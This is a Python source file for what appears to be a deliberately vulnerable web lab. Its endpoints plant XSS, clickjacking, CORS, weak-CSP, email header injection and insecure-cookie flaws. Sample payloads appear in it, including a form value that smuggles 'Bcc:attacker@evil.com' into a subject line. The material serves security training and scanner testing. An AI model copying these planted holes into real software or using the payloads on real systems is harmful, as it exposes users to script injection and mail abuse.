"""Extra XSS flavors, CORS null, clickjacking, CSP, email header injection."""

from __future__ import annotations

import html
from typing import Dict

from http_util import page, send
from registry import register

_STORED: Dict[str, str] = {"msg": "hello"}


@register(
    "/xss/stored",
    title="Stored XSS guestbook",
    family="xss",
    expected="stored HTML executed for later visitors",
    tags=["active", "post", "lab"],
)
def xss_stored(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    if handler.command == "POST" or "msg" in params and handler.command == "GET" and params.get("submit"):
        _STORED["msg"] = params.get("msg", "")
    msg = _STORED.get("msg", "")
    body = (
        "<!DOCTYPE html><html><head><title>Guestbook</title></head><body>"
        "<h1>Guestbook</h1>"
        f"<div id='wall'>{msg}</div>"
        '<form method="POST" action="/xss/stored">'
        '<input name="msg" value=""><button type="submit">Post</button></form>'
        "</body></html>"
    ).encode()
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/dom",
    title="DOM XSS hash/query sink",
    family="xss",
    expected="location.hash written to innerHTML",
    tags=["active", "browser"],
)
def xss_dom(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    body = b"""<!DOCTYPE html><html><head><title>DOM XSS</title></head><body>
<div id="out"></div>
<script>
var h = location.hash.slice(1) || new URLSearchParams(location.search).get('q') || '';
document.getElementById('out').innerHTML = decodeURIComponent(h);
</script>
<p>Use #&lt;img src=x onerror=alert(1)&gt; or ?q=</p>
</body></html>"""
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/svg",
    title="SVG XSS upload content",
    family="xss",
    expected="image/svg+xml with script served",
    tags=["active"],
)
def xss_svg(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    svg = params.get("svg") or '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text>x</text></svg>'
    send(handler, 200, svg.encode(), headers={"Content-Type": "image/svg+xml"}, head_only=head_only)


@register(
    "/clickjack",
    title="Clickjackable dashboard",
    family="clickjacking",
    expected="no X-Frame-Options / CSP frame-ancestors",
    tags=["passive"],
)
def clickjack(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    # Deliberately omit frame protections
    send(
        handler,
        200,
        page("Transfer funds", '<button>Confirm $10,000 transfer</button>'),
        headers={"Content-Security-Policy": "default-src *"},
        head_only=head_only,
    )


@register(
    "/cors/null-origin",
    title="CORS reflects null origin",
    family="cors",
    expected="ACAO: null with credentials",
    tags=["passive"],
)
def cors_null(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    origin = handler.headers.get("Origin") or "null"
    # Reflect even null
    headers = {
        "Access-Control-Allow-Origin": origin if origin else "null",
        "Access-Control-Allow-Credentials": "true",
    }
    send(handler, 200, page("CORS null", "<pre>secret=cors-null-session</pre>"), headers=headers, head_only=head_only)


@register(
    "/csp/bypass",
    title="Weak CSP with script gadget",
    family="csp",
    expected="CSP allows unsafe-inline / JSONP host",
    tags=["passive", "active"],
)
def csp_bypass(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    q = params.get("q", "")
    headers = {
        "Content-Security-Policy": "default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval'",
    }
    body = f"<!DOCTYPE html><html><body><div>{q}</div><script>/* gadget */</script></body></html>".encode()
    send(handler, 200, body, headers=headers, head_only=head_only)


@register(
    "/email/draft",
    title="Email header injection",
    family="email_injection",
    expected="CRLF in subject/body injects headers",
    tags=["active", "post"],
)
def email_draft(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    to = params.get("to", "user@example.com")
    subject = params.get("subject", "Hello")
    if handler.command == "GET" and "subject" not in params:
        body = page(
            "Contact",
            '<form method="POST" action="/email/draft">'
            '<input name="to" value="user@example.com">'
            '<input name="subject" value="Hi%0aBcc:attacker@evil.com">'
            '<button type="submit">Send</button></form>',
        )
        return send(handler, 200, body, head_only=head_only)
    injected = "%0a" in subject.lower() or "\n" in subject or "bcc:" in subject.lower()
    text = f"Queued mail to={to} subject={subject}"
    if injected:
        text += " | header injection accepted"
    send(handler, 200, page("Mailer", f"<pre>{html.escape(text)}</pre>"), head_only=head_only)


@register(
    "/websocket/info",
    title="Unauthenticated WebSocket endpoint info",
    family="websocket",
    expected="WS URL without auth advertised",
    tags=["passive"],
)
def ws_info(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    send(
        handler,
        200,
        page(
            "Live feed",
            "<pre>wss://horizon-catalog.onrender.com/ws/admin/events?api_key=ws-playground-key</pre>"
            "<script>/* new WebSocket(...) */</script>",
        ),
        head_only=head_only,
    )


@register(
    "/mixed/insecure",
    title="Mixed content / insecure cookie",
    family="cookies",
    expected="Secure flag missing on HTTPS cookie; http:// asset ref",
    tags=["passive"],
)
def mixed_insecure(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    send(
        handler,
        200,
        page("Shop", '<img src="http://cdn.example.com/logo.png"><p>checkout</p>'),
        headers={"Set-Cookie": "cart=1; Path=/"},  # no Secure
        head_only=head_only,
    )
